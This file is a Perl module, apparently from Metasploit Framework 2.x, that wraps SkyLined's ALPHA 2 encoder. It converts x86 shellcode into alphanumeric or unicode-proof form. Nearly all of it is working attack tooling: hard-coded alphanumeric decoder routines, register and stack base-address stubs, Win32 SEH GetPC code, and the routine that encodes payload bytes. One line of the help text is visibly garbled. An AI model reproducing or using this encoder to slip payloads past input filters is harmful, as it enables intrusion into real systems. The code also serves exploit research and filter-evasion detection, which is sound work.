#!/usr/bin/perl
use strict;
package Msf::Encoder::SkyAlphaNum;
use base 'Msf::Encoder';

q{
#define VERSION_STRING "ALPHA 2: Zero-tolerance. (build 07)"
#define COPYRIGHT      "Copyright (C) 2003, 2004 by Berend-Jan Wever."
/*
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance.
   SS"  Y$P"  SY"  ,SY 
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________

  This program is free software; you can redistribute it and/or modify it under
  the terms of the GNU General Public License version 2, 1991 as published by
  the Free Software Foundation.

  This program is distributed in the hope that it will be useful, but WITHOUT
  ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
  FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
  details.

  A copy of the GNU General Public License can be found at:
    http://www.gnu.org/licenses/gpl.html
  or you can write to:
    Free Software Foundation, Inc.
    59 Temple Place - Suite 330
    Boston, MA  02111-1307
    USA.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.
*/
};

sub Version {
  my $version = q{
________________________________________________________________________________

    ,sSSs,,s,  ,sSSSs,  ALPHA 2: Zero-tolerance. (build 07)
   SS"  Y$P"  SY"  ,SY
  iS'   dY       ,sS"   Unicode-proof uppercase alphanumeric shellcode encoding.
  YS,  dSb    ,sY"      Copyright (C) 2003, 2004 by Berend-Jan Wever.
  `"YSS'"S' 'SSSSSSSP   <skylined@edup.tudelft.nl>
________________________________________________________________________________};
}

sub Help {
  my $help = q{
Usage: [OPTION] [BASEADDRESS]
ALPHA 2 encodes your IA-32 shellcode to contain only alphanumeric characters.
The result can optionaly be uppercase-only and/or unicode proof. It is a encoded
version of your origional shellcode. It consists of baseaddress-code with some
padding, a decoder routine and the encoded origional shellcode. This will work
for any target OS. The resulting shellcode needs to have RWE-access to modify
it's own code and decode the origional shellcode in memory.

BASEADDRESS
  The decoder routine needs have it's baseaddress in specified register(s). The
  baseaddress-code copies the baseaddress from the given register or stack
  location into the apropriate registers.
eax, ecx, edx, ecx, esp, ebp, esi, edi
  Take the baseaddress from the given register. (Unicode baseaddress code using
  esp will overwrite the byte of memory pointed to by ebp!)
[esp], [esp-X], [esp+X]
  Take the baseaddress from the stack.
seh
  The windows "Structured Exception Handler" (seh) can be used to calculate
  the baseaddress automatically on win32 systems. This option is not available
  for unicode-proof shellcodes and the uppercase version isn't 100% reliable.
nops
  No baseaddress-code, just padding.  If you need to get the baseaddress from a
  source not on the list use this option (combined with --nocompress) and
  replace the nops with your own code. The ascii decoder needs the baseaddress
  in registers ecx and edx, the unicode-proof decoder only in ecx.
-n
  Do not output a trailing newline after the shellcode.
--nocompress
  The baseaddress-code uses "dec"-instructions to lower the required padding
  length. The unicode-proof code will overwrite some bytes in front of the
  shellcode as a result. Use this option if you do not want the "dec"-s.
--unicode
  Make shellcode unicode-proof. This means it will only work when it gets
  converted to unicode (inserting a '0' after each byte) before it gets
  executed.
--uppercase
  Make shellcode 1003221222628ppercase characters, uses a few more bytes then
  mixedcase shellcodes.
--sources
  Output a list of BASEADDRESS options for the given combination of --uppercase
  and --unicode.
--help
  Display this help and exit
--version
  Output version information and exit

See the source-files for further details and copying conditions. There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.

Acknowledgements:
  Thanks to rix for his phrack article on aphanumeric shellcode.
  Thanks to obscou for his phrack article on unicode-proof shellcode.
  Thanks to Costin Ionescu for the idear behind w32 SEH GetPC code.

Report bugs to <skylined@edup.tudelft.nl>
};
}

sub _Encode {
  my $self = shift;
  my $raw = shift;
  my $encoder = shift;
  my $type = shift;

  my $stub;
  my $decoder;
  my $encoded;

  if($encoder eq 'mixed') {
    $decoder = $self->_MakeDecoder;
    $stub = $self->_MakeStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'upper') {
    $decoder = $self->_MakeUpperDecoder;
    $stub = $self->_MakeUpperStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'unicodeMixed') {
    $decoder = $self->_MakeUnicodeDecoder;
    $stub = $self->_MakeUnicodeStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'unicodeUpper') {
    $decoder = $self->_MakeUnicodeUpperDecoder;
    $stub = $self->_MakeUnicodeUpperStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'mixedNocompress') {
    $decoder = $self->_MakeDecoder;
    $stub = $self->_MakeNocompressStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'upperNocompress') {
    $decoder = $self->_MakeUpperDecoder;
    $stub = $self->_MakeUpperNocompressStub($type);
    $encoded = $self->EncodeData($raw);
  }
  elsif($encoder eq 'unicodeMixedNocompress') {
    $decoder = $self->_MakeUnicodeDecoder;
    $stub = $self->_MakeUnicodeNocompressStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }
  elsif($encoder eq 'unicodeUpperNocompress') {
    $decoder = $self->_MakeUnicodeUpperDecoder;
    $stub = $self->_MakeUnicodeUpperNocompressStub($type);
    $encoded = $self->EncodeData($raw, 'unicode' => 1);
  }

  if(!defined($stub)) {
    $self->PrintDebugLine(3, "Failed to build stub for $type");
    return;
  }
  if(!defined($decoder)) {
    $self->PrintDebugLine(3, "Failed to build decoder for $encoder");
    return;
  }
  if(!defined($encoded) && length($raw) > 0) {
    $self->PrintDebugLine(3, "Failed to encoder raw payload data");
    return;
  }
  return($stub . $decoder . $encoded);
}

sub EncodeData {
  my $self = shift;
  my $raw = shift;
  my %options = @_;

  my $validChars = $options{'validChars'};
  $validChars = '0123456789BCDEFGHIJKLMNOPQRSTUVWXYZ' if(!defined($validChars));
  my $unicode = $options{'unicode'};
#  $unicode = 1;

  my $data;

  # Optimization, or something.
  my $vlength = length($validChars);

  foreach my $char (split('', $raw)) {
    # // encoding AB -> CD 00 EF 00
    my $A = (ord($char) & 0xf0) >> 4;
    my $B = (ord($char) & 0x0f);
    
    my $F = $B;
    # // E is arbitrary as long as EF is a valid character
    my $i = int(rand($vlength));

    while((ord(substr($validChars, $i, 1)) & 0x0f) != $F) {
      $i = ++$i % $vlength;
    }

    my $E = ord(substr($validChars, $i, 1)) >> 4;
    # // normal code uses xor, unicode-proof uses ADD.
    # // AB -> 
    my $D = $unicode ? ($A - $E) & 0x0f : ($A ^ $E);
    # // C is arbitrary as long as CD is a valid character
    $i = int(rand($vlength));
  
    while((ord(substr($validChars, $i, 1)) & 0x0f) != $D) {
      $i = ++$i % $vlength;
    }

    my $C = ord(substr($validChars, $i, 1)) >> 4;
    $data .= chr(($C << 4) + $D) . chr(($E << 4) + $F);

  }

  $data .= 'A';
  return($data);
}


#
# Win32 SEH GetPC code, puts EIP in ecx
#
sub _MakeW32SehGetPc {
  my $self = shift;
  my $w32SehGetPc = 
    'VTX630VXH49HHHPhYAAQhZYYYYAAQQDDDd36FFFFTXVj0PPTUPPa301089';
  return($w32SehGetPc);
}
sub _MakeUpperW32SehGetPc {
  my $self = shift;
  my $upperW32SehGetPc = 
    'VTX630WTX638VXH49HHHPVX5AAQQPVX5YYYYP5YYYD5KKYAPTTX638TDDNVDDX4Z4A63861816';
  return($upperW32SehGetPc);
}

#
# Ascii Mixedcase Decoder / Stubs
#
sub _MakeDecoder {
  my $self = shift;
  my $decoder = 
    'jAXP0A0AkAAQ2AB2BB0BBABXP8ABuJI';
  return($decoder);
}

sub _MakeStub {
  my $self = shift;
  my $type = shift;

  my $stubs = {
    'nops'      => 'IIIIIIIIIIIIIIIIII7',
    'eax'       => 'PYIIIIIIIIIIIIIIII7QZ',
    'ecx'       => 'IIIIIIIIIIIIIIIII7QZ',
    'edx'       => 'JJJJJJJJJJJJJJJJJ7RY',
    'ebx'       => 'SYIIIIIIIIIIIIIIII7QZ',
    'esp'       => 'TYIIIIIIIIIIIIIIII7QZ',
    'ebp'       => 'UYIIIIIIIIIIIIIIII7QZ',
    'esi'       => 'VYIIIIIIIIIIIIIIII7QZ',
    'edi'       => 'WYIIIIIIIIIIIIIIII7QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLYIIIIIIIIIQZ',
    '[esp-C]'   => 'LLLLLLLLLLLLYIIIIIIIIIIIQZ',
    '[esp-8]'   => 'LLLLLLLLYIIIIIIIIIIIIIQZ',
    '[esp-4]'   => 'LLLL7YIIIIIIIIIIIIII7QZ',
    '[esp]'     => 'YIIIIIIIIIIIIIIIIIQZ',
    '[esp+4]'   => 'YYIIIIIIIIIIIIIIII7QZ',
    '[esp+8]'   => 'YYYIIIIIIIIIIIIIIIIQZ',
    '[esp+C]'   => 'YYYYIIIIIIIIIIIIIII7QZ',
    '[esp+10]'  => 'YYYYYIIIIIIIIIIIIIIIQZ',
    '[esp+14]'  => 'YYYYYYIIIIIIIIIIIIII7QZ',
    '[esp+18]'  => 'YYYYYYYIIIIIIIIIIIIIIQZ',
    '[esp+1C]'  => 'YYYYYYYYIIIIIIIIIIIII7QZ',
  };

  $stubs->{'seh'} = $self->_MakeW32SehGetPc . $stubs->{'ecx'};
  return($stubs->{$type});
}

#
# Ascii Uppercase Decoder / Stubs
#
sub _MakeUpperDecoder {
  my $self = shift;
  my $upperDecoder =
    'VTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJI';
  return($upperDecoder);
}

sub _MakeUpperStub {
  my $self = shift;
  my $type = shift;

  my $upperStubs = {
    'nops'      => 'IIIIIIIIIIII',
    'eax'       => 'PYIIIIIIIIIIQZ',
    'ecx'       => 'IIIIIIIIIIIQZ',
    'edx'       => 'JJJJJJJJJJJRY',
    'ebx'       => 'SYIIIIIIIIIIQZ',
    'esp'       => 'TYIIIIIIIIIIQZ',
    'ebp'       => 'UYIIIIIIIIIIQZ',
    'esi'       => 'VYIIIIIIIIIIQZ',
    'edi'       => 'WYIIIIIIIIIIQZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLYII7QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLYIIII7QZ',
    '[esp-8]'   => 'LLLLLLLLYIIIIII7QZ',
    '[esp-4]'   => 'LLLL7YIIIIIIIIQZ',
    '[esp]'     => 'YIIIIIIIIII7QZ',
    '[esp+4]'   => 'YYIIIIIIIIIIQZ',
    '[esp+8]'   => 'YYYIIIIIIIII7QZ',
    '[esp+C]'   => 'YYYYIIIIIIIIIQZ',
    '[esp+10]'  => 'YYYYYIIIIIIII7QZ',
    '[esp+14]'  => 'YYYYYYIIIIIIIIQZ',
    '[esp+18]'  => 'YYYYYYYIIIIIII7QZ',
    '[esp+1C]'  => 'YYYYYYYYIIIIIIIQZ',
  };

  $upperStubs->{'seh'} = $self->_MakeUpperW32SehGetPc . $upperStubs->{'ecx'};

  return($upperStubs->{$type});
}
  
#
# Unicode Mixedcase Decoder / Stubs
#
sub _MakeUnicodeDecoder {
  my $self = shift;
  my $unicodeDecoder = 
    'jXAQADAZABARALAYAIAQAIAQAIAhAAAZ1AIAIAJ11AIAIABABABQI1AIQIAIQI111AIAJQYA'.
    'ZBABABABABkMAGB9u4JB';
  return($unicodeDecoder);
}
sub _MakeUnicodeStub {
  my $self = shift;
  my $type = shift;

  my $unicodeStubs = {
    'nops'     => 'IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444',
    'eax'      => 'PPYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ecx'      => 'IAIAIAIAIAIAIAIAIAIAIAIAIAIA4444',
    'edx'      => 'RRYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ebx'      => 'SSYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'esp'      => 'TUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'ebp'      => 'UUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'esi'      => 'VVYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    'edi'      => 'WWYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
    '[esp]'    => 'YAIAIAIAIAIAIAIAIAIAIAIAIAIAIA44',
    '[esp+4]'  => 'YUYAIAIAIAIAIAIAIAIAIAIAIAIAIAIA',
  };
  return($unicodeStubs->{$type});
}

#
# Unicode Uppercase Decoder / Stubs
#
sub _MakeUnicodeUpperDecoder {
  my $self = shift;
  my $unicodeUpperDecoder = 
    'QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABAB'.
    'QI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB';
  return($unicodeUpperDecoder);
}
sub _MakeUnicodeUpperStub {
  my $self = shift;
  my $type = shift;

  my $unicodeUpperStubs = {
    'nops'     => 'IAIAIAIA4444',
    'eax'      => 'PPYAIAIAIAIA',
    'ecx'      => 'IAIAIAIA4444',
    'edx'      => 'RRYAIAIAIAIA',
    'ebx'      => 'SSYAIAIAIAIA',
    'esp'      => 'TUYAIAIAIAIA',
    'ebp'      => 'UUYAIAIAIAIA',
    'esi'      => 'VVYAIAIAIAIA',
    'edi'      => 'WWYAIAIAIAIA',
    '[esp]'    => 'YAIAIAIAIA44',
    '[esp+4]'  => 'YUYAIAIAIAIA',
  };
  return($unicodeUpperStubs->{$type});
}


#
# Ascii Mixedcase Nocompress Stubs
#
sub _MakeNocompressStub {
  my $self = shift;
  my $type = shift;

  my $nocompressStubs = {
    'nops'      => '7777777777777777777777777777777777777',
    'eax'       => 'PY777777777777777777777777777777777QZ',
    'ecx'       => '77777777777777777777777777777777777QZ',
    'edx'       => '77777777777777777777777777777777777RY',
    'ebx'       => 'SY777777777777777777777777777777777QZ',
    'esp'       => 'TY777777777777777777777777777777777QZ',
    'ebp'       => 'UY777777777777777777777777777777777QZ',
    'esi'       => 'VY777777777777777777777777777777777QZ',
    'edi'       => 'WY777777777777777777777777777777777QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLY777777777777777777QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLY7777777777777777777777QZ',
    '[esp-8]'   => 'LLLLLLLLY77777777777777777777777777QZ',
    '[esp-4]'   => 'LLLL7Y77777777777777777777777777777QZ',
    '[esp]'     => 'Y7777777777777777777777777777777777QZ',
    '[esp+4]'   => 'YY777777777777777777777777777777777QZ',
    '[esp+8]'   => 'YYY77777777777777777777777777777777QZ',
    '[esp+C]'   => 'YYYY7777777777777777777777777777777QZ',
    '[esp+10]'  => 'YYYYY777777777777777777777777777777QZ',
    '[esp+14]'  => 'YYYYYY77777777777777777777777777777QZ',
    '[esp+18]'  => 'YYYYYYY7777777777777777777777777777QZ',
    '[esp+1C]'  => 'YYYYYYYY777777777777777777777777777QZ',
  };

  $nocompressStubs->{'seh'} = $self->_MakeW32SehGetPc . $nocompressStubs->{'ecx'};
  return($nocompressStubs->{$type});
}

#
# Ascii Uppercase Nocompress Stubs
#
sub _MakeUpperNocompressStub {
  my $self = shift;
  my $type = shift;

  my $upperNocompressStubs = {
    'nops'      => '777777777777777777777777',
    'eax'       => 'PY77777777777777777777QZ',
    'ecx'       => '7777777777777777777777QZ',
    'edx'       => '7777777777777777777777RY',
    'ebx'       => 'SY77777777777777777777QZ',
    'esp'       => 'TY77777777777777777777QZ',
    'ebp'       => 'UY77777777777777777777QZ',
    'esi'       => 'VY77777777777777777777QZ',
    'edi'       => 'WY77777777777777777777QZ',
    '[esp-10]'  => 'LLLLLLLLLLLLLLLLY77777QZ',
    '[esp-C]'   => 'LLLLLLLLLLLLY777777777QZ',
    '[esp-8]'   => 'LLLLLLLLY7777777777777QZ',
    '[esp-4]'   => 'LLLL7Y7777777777777777QZ',
    '[esp]'     => 'Y777777777777777777777QZ',
    '[esp+4]'   => 'YY77777777777777777777QZ',
    '[esp+8]'   => 'YYY7777777777777777777QZ',
    '[esp+C]'   => 'YYYY777777777777777777QZ',
    '[esp+10]'  => 'YYYYY77777777777777777QZ',
    '[esp+14]'  => 'YYYYYY7777777777777777QZ',
    '[esp+18]'  => 'YYYYYYY777777777777777QZ',
    '[esp+1C]'  => 'YYYYYYYY77777777777777QZ',
  };

  $upperNocompressStubs->{'seh'} = $self->_MakeUpperW32SehGetPc . $upperNocompressStubs->{'ecx'};

  return($upperNocompressStubs->{$type});
}

#
# Unicode Mixedcase Nocompress Stubs
#
sub _MakeUnicodeNocompressStub {
  my $self = shift;
  my $type = shift;

  my $unicodeNocompressStubs = {
    'nops'     => '444444444444444444444444444444444444444',
    'eax'      => 'PPYA44444444444444444444444444444444444',
    'ecx'      => '444444444444444444444444444444444444444',
    'edx'      => 'RRYA44444444444444444444444444444444444',
    'ebx'      => 'SSYA44444444444444444444444444444444444',
    'esp'      => 'TUYA44444444444444444444444444444444444',
    'ebp'      => 'UUYA44444444444444444444444444444444444',
    'esi'      => 'VVYA44444444444444444444444444444444444',
    'edi'      => 'WWYA44444444444444444444444444444444444',
    '[esp]'    => 'YA4444444444444444444444444444444444444',
    '[esp+4]'  => 'YUYA44444444444444444444444444444444444',
  };

  return($unicodeNocompressStubs->{$type});
}

#
# Unicode Uppercase Nocompress Stubs
#
sub _MakeUnicodeUpperNocompressStub {
  my $self = shift;
  my $type = shift;

  my $unicodeUpperNocompressStubs = {
    'nops'    => '44444444444444',
    'eax'     => 'PPYA4444444444',
    'ecx'     => '44444444444444',
    'edx'     => 'RRYA4444444444',
    'ebx'     => 'SSYA4444444444',
    'esp'     => 'TUYA4444444444',
    'ebp'     => 'UUYA4444444444',
    'esi'     => 'VVYA4444444444',
    'edi'     => 'WWYA4444444444',
    '[esp]'   => 'YA444444444444',
    '[esp+4]' => 'YUYA4444444444',
  };
  return($unicodeUpperNocompressStubs->{$type});
}

1;
